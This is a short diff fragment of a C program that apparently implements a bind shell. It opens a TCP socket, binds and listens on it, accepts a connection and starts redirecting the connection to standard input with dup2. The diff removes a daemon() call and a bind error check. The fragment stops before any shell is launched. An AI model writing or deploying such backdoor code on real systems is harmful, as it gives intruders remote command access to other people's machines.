@@ -7,12 +7,9 @@ int main(void)
                     "\x00\x00\x00\x00"
                     "\x00\x00\x00\x00"
                     "\x00\x00\x00\x00";
-  daemon(1, 0);
 
   sd = socket(2, 1, 6);
-  if (bind(sd, servaddr, 16) !=0) return;
-
-
+  bind(sd, servaddr, 16);
   listen(sd, 1);
   cli = accept(sd, 0, 0);
   dup2(cli, 0);
